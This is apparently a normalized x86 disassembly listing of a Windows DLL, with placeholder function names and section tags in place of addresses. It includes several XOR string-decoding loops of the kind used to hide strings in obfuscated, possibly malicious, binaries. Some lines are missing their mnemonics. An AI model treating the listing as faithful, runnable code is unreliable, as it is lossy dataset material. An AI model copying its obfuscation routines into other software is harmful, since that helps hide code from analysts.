mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x64 ]
test esi esi
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x111
call sub_1001bb80
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x64 ]
test esi esi
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax 0x2
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10060aae
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_1003938d
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10060af0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008136b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor eax eax
cmp edx 0x5
ja r-xdata
or eax 0xffffffff
jmp [ edx * 4 + jump_table_10060bfc ]
mov ecx [ ecx + 0x4 ]
push 0x104
lea eax [ ebp - 0x218 ]
push eax
push 0xffffffff
push ecx
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
lea edx [ ebp - 0x218 ]
push 0x5c
push edx
call sub_1005cfc8
add esp 0x8
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ecx + 0x24 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
xor ecx ecx
lea edx [ ebp - 0x218 ]
lea edi [ ebp - 0x248 ]
lea esi [ ebp - 0x23c ]
mov [ ebp - 0x248 ] edx
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x240 ] ecx
call sub_1003a2c0
mov [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
add edi 0x1c
mov ecx esi
call sub_10039430
call sub_10016390
push 0x104
add eax 0x2
push eax
lea eax [ ebp - 0x218 ]
push 0x104
push eax
call sub_10054118
add esp 0x10
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10060c14
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1003938d
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10060c46
push 0x28
mov eax sub_1007e5a2
call sub_10050d0f
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_1001a8af
mov [ esi ] r--data
jmp r-xdata
sub_10060ce0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x4444444
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10052185
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
mov eax ecx
shl eax 0x4
sub eax ecx
add eax eax
add eax eax
push eax
call sub_1005ac7e
add esp 0x4
test eax eax
jne r-xdata
sub_10060d38
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
sar esi 0x1
sar edi 0x1
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_100539e5
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push eax
call sub_100641b2
add esp 0x18
test eax eax
jne r-xdata
mov edx esi
cmp esi edi
jl r-xdata
test eax eax
jne r-xdata
sub eax 0x2
call sub_10012991
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push ebx
jmp r-xdata
mov edx edi
pop edi
pop esi
pop ebp
retn
test edx edx
jg r-xdata
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
xor eax eax
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add eax 0x2
add ecx 0x2
dec edx
cmp esi edi
je r-xdata
pop ebx
test eax eax
jne r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_10060de1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10060e67
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100582b2
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10060ea7
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_1001e1bc
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_10060ef0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x20 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ esi ] eax
xor edx edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx ] ecx
mov eax [ esi ]
cmp eax edi
setne dl
mov [ ebp + 0x14 ] edx
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov ecx [ ebx ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
mov edx [ ebp + 0x8 ]
push edx
mov edx edi
sub edx eax
push edx
push eax
push ecx
call sub_10024496
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] edi
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn 0x1c
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ ebx ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ ebx ] 0x2
mov [ ebp + 0x14 ] 0x0
cmp [ esi ] edi
jne r-xdata
xor eax eax
mov eax [ esi ]
lea edx [ eax + 0x1 ]
mov edi edi
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_10060fa9
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10037533
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
sub_1006101a
push 0x8
mov eax sub_1007e541
call sub_1005d45e
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_1006312b
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10035d92
push eax
call sub_1001e5b8
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_1004a04c
push eax
call sub_1001e5b8
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1005e832
mov [ esi + 0x10 ] eax
call sub_1001a1b3
retn 0x4
sub_100610b0
push ebp
mov ebp esp
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x6a
call sub_1001bb80
push rw-data
push esi
mov ecx edx
call sub_100252b0
add esp 0x8
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xe0 ]
mov eax 0x76
call sub_1001bb80
push rw-data
push esi
mov ecx edx
call sub_100252b0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x128 ]
mov eax 0xec
call sub_1001bb80
push rw-data
push esi
mov ecx edx
call sub_100252b0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x50 ]
mov eax 0xa8
call sub_1001bb80
push rw-data
push esi
mov ecx edx
call sub_100252b0
mov ecx [ ebp - 0x4 ]
add esp 0x8
neg eax
sbb eax eax
xor ecx ebp
and eax 0x5
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100611b0
push esi
lea esi [ ebx - 0x1 ]
test esi esi
js r-xdata
xor edx edx
mov [ edi + ebx * 2 ] dx
pop esi
retn
jmp r-xdata
mov eax 0xcccccccd
mul ecx
shr edx 0x3
lea eax [ edx + edx * 4 ]
add eax eax
sub ecx eax
add ecx 0x30
dec esi
mov [ edi + esi * 2 + 0x2 ] cx
mov ecx edx
jns r-xdata
xor ecx ecx
mov [ edi + ebx * 2 ] cx
pop esi
retn
sub_100611fe
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_100456d4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_10065045
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_10065045
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_10061250
push ebp
mov ebp esp
sub esp 0x118
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov ecx [ r--data ]
mov ebx edx
mov [ ebp - 0xf8 ] edi
mov [ ebp - 0x104 ] edi
xor eax eax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x73
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x104 ]
push ecx
lea edx [ ebp - 0xc ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x12f
mov [ ebp - 0xfc ] edi
call sub_1000a6f0
lea eax [ ebp - 0xfc ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x132
call sub_1000a6f0
mov [ ebp - 0xf8 ] 0x1
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x6d
mov [ ebp - 0x108 ] edi
call sub_1000a6f0
lea edx [ ebp - 0x108 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0xfc ] edi
mov eax [ ebp - 0x104 ]
mov esi [ SysFreeString@IAT ]
push eax
call esi
mov ecx [ ebp - 0x108 ]
push ecx
call esi
mov edx [ ebp - 0x110 ]
push edx
call esi
mov eax [ ebp - 0x118 ]
push eax
call esi
mov ecx [ ebp - 0x114 ]
push ecx
call esi
mov edx [ ebp - 0x10c ]
push edx
call esi
mov eax [ ebp - 0x100 ]
push eax
call esi
mov eax [ ebp - 0xfc ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0x7a
mov [ ebp - 0x110 ] edi
call sub_1000a6f0
lea ecx [ ebp - 0x110 ]
push ecx
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xec ]
mov eax 0x11
call sub_1000a6f0
mov [ ebp - 0xf8 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0xf8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
call esi
lea edx [ ebp - 0x5c ]
mov eax 0x80
mov [ ebp - 0x118 ] edi
call sub_1000a6f0
lea eax [ ebp - 0x118 ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x56
call sub_1000a6f0
mov [ ebp - 0xf8 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0xe5
mov [ ebp - 0x114 ] edi
call sub_1000a6f0
lea edx [ ebp - 0x114 ]
push edx
lea eax [ ebp - 0x70 ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x76
call sub_1000a6f0
mov [ ebp - 0xf8 ] 0x4
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x7b
mov [ ebp - 0x10c ] edi
call sub_1000a6f0
lea ecx [ ebp - 0x10c ]
push ecx
push edx
call sub_100145e0
lea edx [ ebp - 0x90 ]
mov eax 0xab
mov [ ebp - 0x100 ] edi
call sub_1000a6f0
lea eax [ ebp - 0x100 ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x10
push 0x24
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x5c
call sub_1000a6f0
xor eax eax
mov edx [ ebp - 0x100 ]
mov ecx [ ebp - 0x10c ]
push edx
mov edx [ ebp - 0x114 ]
push ecx
mov ecx [ ebp - 0x108 ]
push edx
mov edx [ ebp - 0x104 ]
push ecx
mov ecx [ ebp - 0x110 ]
push edx
mov edx [ ebp - 0x118 ]
mov esi eax
call sub_100521b0
jmp r-xdata
mov edi eax
call sub_1002db20
xor edi edi
mov [ ebx ] eax
mov ebx [ ebp - 0xfc ]
cmp ebx edi
je r-xdata
sub_10061530
push ebp
mov ebp esp
push 0xffffffff
push sub_100826e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov edi edx
xor esi esi
xor edx edx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x30 ] dx
lea eax [ ebp - 0x30 ]
push eax
push edi
mov [ ebp - 0x4 ] esi
call sub_10026610
test eax eax
je r-xdata
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0xc ] esi
je r-xdata
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edx [ ebp - 0x6c ]
mov ecx [ ebp - 0x68 ]
push edx
lea ebx [ ebp - 0x64 ]
lea edx [ ebp - 0x30 ]
call sub_1001cc80
mov ebx [ ebp - 0x64 ]
test eax eax
je r-xdata
xor edx edx
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x54 ] dx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x2
mov edi [ edi + 0x10 ]
mov eax edi
lea edx [ eax + 0x2 ]
mov edi edi
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
cmp ebx esi
je r-xdata
cmp ebx esi
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x54 ]
call sub_1005e3c0
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x54 ]
lea edi [ ebp - 0x64 ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] eax
call sub_1003e740
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x40 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edi [ ebp - 0x60 ]
mov eax ebx
call sub_1001b300
push ebx
call sub_10065045
add esp 0x4
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edi [ ebp - 0x60 ]
mov eax ebx
call sub_1001b300
push ebx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x54 ]
push ecx
call sub_10065045
add esp 0x4
xor eax eax
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_10065045
add esp 0x4
sub_100616c6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10052185
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1002050e
int3
sub_10061700
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
xor edi edi
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x14 ] edi
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ebx [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
add edx 0x8
push edx
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
sub ecx esi
push ecx
lea edx [ ebp + 0x8 ]
push esi
push edx
call sub_10024496
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
inc edi
add esi eax
cmp edi [ ebp + 0x14 ]
jb r-xdata
xor eax eax
mov eax esi
lea edx [ eax + 0x1 ]
jmp r-xdata
cmp esi ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_100617c2
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_1002868d
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_10017bc2
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x18
sub_10061828
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1005bf6b
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_10061855
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1000794b
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_10061881
push 0x38
mov eax sub_1007e82c
call sub_10007703
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10042119
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_1002a730
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10045daa
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_10019c00
retn 0x20
sub_10061937
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100324d8
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_10061970
push ebp
mov ebp esp
push 0xffffffff
push sub_10081716
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x2bc ] eax
mov [ ebp - 0x2c4 ] edi
mov [ ebp - 0x2c0 ] 0x0
xor eax eax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff0
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
lea ebx [ ebx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff99
and edx 0xff
mov [ ebp + eax * 2 - 0xc0 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xa8 ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x3c
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8e ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffae
and edx 0xff
mov [ ebp + eax * 2 - 0x8c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x76 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x74
and edx 0xff
mov [ ebp + eax * 2 - 0x74 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x77
and edx 0xff
mov [ ebp + eax * 2 - 0x5c ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x4a ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x66
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x38 ] ax
lea ebx [ eax + 0x7 ]
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb5
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax ebx
jb r-xdata
mov ecx [ edi + 0x48 ]
xor eax eax
